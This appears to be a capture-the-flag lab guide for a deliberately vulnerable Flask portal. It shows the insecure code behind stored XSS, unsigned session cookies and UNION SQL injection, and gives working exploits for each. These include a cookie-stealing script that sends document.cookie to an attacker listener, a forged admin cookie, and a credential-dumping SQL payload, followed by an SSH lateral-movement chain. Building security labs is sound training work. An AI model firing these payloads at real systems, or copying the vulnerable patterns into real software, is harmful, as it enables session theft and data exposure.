# LAB2 – Server-A (SYNAPSE Intelligence Portal)

Server-A hosts the SYNAPSE Intelligence Portal — a deliberately vulnerable Flask web application deployed via Docker Compose.

---

## Access

```bash
sshpass -p ubuntu ssh ubuntu@192.168.30.x
# From EVE-NG host with bridge vnet0_2 active (IP 192.168.30.x/24)
```

## System

| Parameter | Value |
|-----------|-------|
| OS | Ubuntu 24.04.3 LTS |
| Hostname | server-a-synapse |
| IP | 192.168.30.x/24 |
| Gateway | 192.168.30.x (VyOS eth1) |
| App path | /opt/synapse/ |

## Docker Compose stack

| Container | Image | Role | Port |
|-----------|-------|------|------|
| synapse_flask_1 | python:3.11-slim | Flask app | 5000 (internal) |
| synapse_nginx_1 | nginx:alpine | Reverse proxy | 80 (public) |
| synapse_victim | playwright/python:v1.58.0-noble | Bot victim | — |

```bash
cd /opt/synapse
docker compose up -d
docker compose ps
```

## Database schema (SQLite)

| Table | Contents |
|-------|---------|
| users | Login credentials (admin, guest) — passwords MD5 |
| reports | Intelligence reports (5 dummy rows) |
| comments | User-submitted comments — **XSS sink** |
| admin_users | Lateral movement creds (monitor / M0nit0r2024) + flag |

## Vulnerability 1 — Stored XSS (`/comments`)

Comments are rendered without sanitisation:

```html
<div class="body">{{ c.body | safe }}</div>
```

The session cookie has `HttpOnly=False`:

```python
resp.set_cookie('session',
    f"{user['id']}:{user['role']}:{user['username']}",
    httponly=False)
```

**Exploit** — post this comment to steal the victim bot's cookie:

```html
<script>
fetch('http://10.0.40.x:8000/?c=' + encodeURIComponent(document.cookie));
</script>
```

Start listener on Parrot first:
```bash
python3 -m http.server 8000
```

The victim bot visits `/comments` every ~20 seconds. The cookie arrives in the listener log within one cycle.

## Vulnerability 2 — Broken Authentication

The session cookie format is `ID:ROLE:USERNAME` with no cryptographic signature:

```python
parts = session.split(':')
role = parts[1] if len(parts) > 1 else 'guest'
```

**Exploit** — forge admin cookie in browser console:
```javascript
document.cookie = "session=1:admin:admin; path=/"
```

Immediately grants admin access without knowing the password.

## Vulnerability 3 — UNION SQL Injection (`/search`)

The search route concatenates user input directly into the SQL query:

```python
query = "SELECT * FROM reports WHERE title LIKE '%" + q + "%'"
```

SQL errors are displayed in the browser. The `reports` table has 5 columns.

**Exploit** — dump `admin_users` table:
```
' UNION SELECT 1,username,password,flag,5 FROM admin_users--
```

Returns: `monitor` / `M0nit0r2024` + `FLAG{synapse_sqli_creds_dumped}`

## Attack chain summary

```
1. POST XSS payload to /comments
2. Wait ~20s → victim cookie arrives on listener
3. Forge admin cookie (broken auth) → access /portal and /search
4. UNION SQLi on /search → dump admin_users
5. SSH to Server-B: ssh monitor@192.168.30.x (password: M0nit0r2024)
6. Execute CMDi on Server-B → final flag
```
